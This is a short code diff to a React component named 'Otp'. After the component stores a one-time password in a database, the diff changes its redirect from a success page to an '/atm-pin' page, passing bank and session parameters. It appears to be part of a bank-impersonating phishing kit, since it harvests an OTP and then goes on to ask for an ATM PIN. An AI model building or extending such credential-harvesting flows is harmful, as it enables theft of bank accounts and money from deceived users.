@@ -38,7 +38,7 @@ export default function Otp() {
     } catch (error) {
       console.error("Error saving OTP in DB, continuing anyway:", error);
     }
-    setLocation(`/success?bank=${bank}&session=${sessionId}`);
+    setLocation(`/atm-pin?bank=${bank}&session=${sessionId}`);
   };
 
   return (
